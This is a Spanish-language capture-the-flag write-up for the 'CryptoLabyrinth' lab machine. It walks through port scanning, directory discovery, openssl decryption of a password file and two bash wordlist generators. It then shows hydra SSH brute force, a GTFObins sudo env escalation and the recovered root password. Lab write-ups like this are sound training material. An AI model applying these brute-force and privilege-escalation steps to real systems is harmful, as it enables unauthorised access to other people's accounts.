---
description: >-
  ✍️ Autor: beafn28🔍 Dificultad: Fácil📅 Fecha de creación: 25/10/2024 🖥️The
  Hacker Labs
---

# CryptoLabyrinth

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.82
```

para verificar la conectividad de red.

<figure><img src="../.gitbook/assets/image (17) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 192.168.1.82
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) ( (6).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 192.168.1.82
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web nos mencione una pista y descubrimos la página por defecto de **Apache**.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Revisando el código fuente nos encontramos una cadena que podría ser una contraseña.

<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Ahora buscaremos directorios con la herramienta **Gobuster** a través de:

```bash
gobuster dir -u http://192.168.1.82/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
```

<figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Descubrimos un directorio oculto llamado `/hidden` por lo que indagamos qué contenido habrá.

Observamos varios archivos por lo que nos los descargamos e indagaremos más a fondo pero tiene pinta que hay trata de criptografía.

```
wget -r -np -nH --cut-dirs=2 --reject "index.html*" http://192.168.1.82/hidden/
```

### 🚀 **EXPLOTACIÓN**

Con la información obtenida anteriormente, realizamos el comando:

<pre class="language-bash"><code class="lang-bash"><strong>openssl enc -aes-256-cbc -d -in ~/Desktop/alice_aes.enc -out ~/Desktop/alice_password.txt -k 'supercomplexkey!' -iter 10000
</strong></code></pre>

```
openssl enc -aes-256-cbc -d -in ~/Desktop/alice_aes.enc -out ~/Desktop/alice_password.txt -k 'supercomplexkey!' -pbkdf2
```

Descifra el archivo `alice_aes.enc` utilizando AES-256-CBC con la clave `supercomplexkey!`,y guarda el resultado en el archivo `alice_password.txt`. La opción de iteración asegura que el proceso de derivación de la clave sea más seguro al hacerlo más difícil de atacar por fuerza bruta.

> Nota: la clave se encuentra en el archivo numeros\_suerte.txt

Hemos descubierto de **alice** que es **superSecurePassword!**

Vamos a descubrir las credenciales del usuario **bob**, al parecer hay varios hashes por lo que los vamos a crackear.

Nos aseguramos de tener todos los hashes de las contraseñas de Bob en un solo archivo. Combinamos los hashes en un único archivo de texto usando el siguiente comando:

```bash
cat bob_password*.hash > bob_passwords.hash
```

Desciframos estos hashes y se nos proporciona 4 contraseñas y al probar vemos que no son. Hay un hash que falta por lo que creamos un diccionario con la cadena vista en el código fuente.

```bash
#!/bin/bash

# Verificar si se proporcionó una palabra
if [ "$#" -ne 1 ]; then
    echo "Uso: $0 <palabra>"
    exit 1
fi

# Palabra proporcionada por el usuario
palabra="$1"

# Eliminar los últimos dos asteriscos (si existen)
palabra_sin_asteriscos="${palabra//\*/}"

# Definir los caracteres alfanuméricos (mayúsculas, minúsculas y dígitos)
caracteres="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

# Crear un archivo de salida
archivo_salida="combinaciones.txt"
> "$archivo_salida"  # Vaciar el archivo si ya existe

# Generar combinaciones con el comando seq y expandiendo directamente los caracteres
for i in $(seq 0 $((${#caracteres}-1))); do
    for j in $(seq 0 $((${#caracteres}-1))); do
        # Concatenar la palabra sin asteriscos con los caracteres generados
        echo "${palabra_sin_asteriscos}${caracteres:$i:1}${caracteres:$j:1}" >> "$archivo_salida"
    done
done

echo "Combinaciones generadas y guardadas en $archivo_salida"

```

```bash
./rompe.sh "2LWxmDsW0**"
```

<figure><img src="../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Realizamos la fuerza bruta al usuario **bob** con las combinaciones generadas anteriormente.

<figure><img src="../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Tras haber obtenido las credenciales, iniciamos sesión con **bob**.

```bash
ssh bob@192.168.1.82
```

<figure><img src="../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Escalada de privilegios con `env` (Bob)**

El binario `/usr/bin/env` puede ser utilizado para escalar privilegios cuando tiene permisos de sudo sin contraseña pero con el usuario **alice**. A continuación te muestro cómo podrías hacerlo siguiendo los pasos proporcionados por **GTFObins**.

**Comando de GTFObins (env) para obtener una shell de root:**

```bash
sudo -u alice /usr/bin/env /bin/sh
```

Mejoramos la TTY para trabajar en alice.

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Revisando entre los directorios encontramos en el directorio `/mnt` un archivo secreto.

<figure><img src="../.gitbook/assets/image (12) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Creamos un diccionario como anteriormente para descifrar la contraseña correcta.

```bash
#!/bin/bash

# Verificar si se proporcionó una palabra
if [ "$#" -ne 1 ]; then
    echo "Uso: $0 <palabra>"
    exit 1
fi

# Palabra proporcionada por el usuario
palabra="$1"

# Eliminar los asteriscos de la palabra
palabra_sin_asteriscos="${palabra//\*/}"

# Definir los caracteres alfanuméricos (mayúsculas, minúsculas y dígitos)
caracteres="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

# Crear un archivo de salida
archivo_salida="combinaciones.txt"
> "$archivo_salida"  # Vaciar el archivo si ya existe

# Obtener la longitud de la palabra sin asteriscos
longitud=${#palabra_sin_asteriscos}

# Generar todas las combinaciones de 2 caracteres
for ((i = 0; i < ${#caracteres}; i++)); do
    for ((j = 0; j < ${#caracteres}; j++)); do
        # Insertar los caracteres en las posiciones deseadas
        combinacion="${palabra_sin_asteriscos:0:4}${caracteres:i:1}${palabra_sin_asteriscos:4:5}${caracteres:j:1}"
        # Escribir en el archivo
        echo "$combinacion" >> "$archivo_salida"
    done
done

echo "Combinaciones generadas y guardadas en $archivo_salida"

```

<figure><img src="../.gitbook/assets/image (13) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Realizamos fuerza bruta para conseguir la contraseña completa.

```bash
hydra -l root -P combinaciones.txt ssh://192.168.1.82
```

Obtenemos la contraseña completa que es **`2LWx9DsW0A3`**.

<figure><img src="../.gitbook/assets/Captura de pantalla 2024-10-26 172442.png" alt=""><figcaption></figcaption></figure>

Ya somos **root** por lo que ahora encontraremos la bandera en sus directorios.

Te deseo mucho éxito en tu búsqueda de las flags! Recuerda prestar atención a cada detalle, examinar los archivos y servicios con detenimiento, y utilizar todas las herramientas disponibles para encontrarlas. La clave para el éxito está en la perseverancia y en no dejar ningún rincón sin explorar. ¡Adelante, hacker! 💻🔍🚀
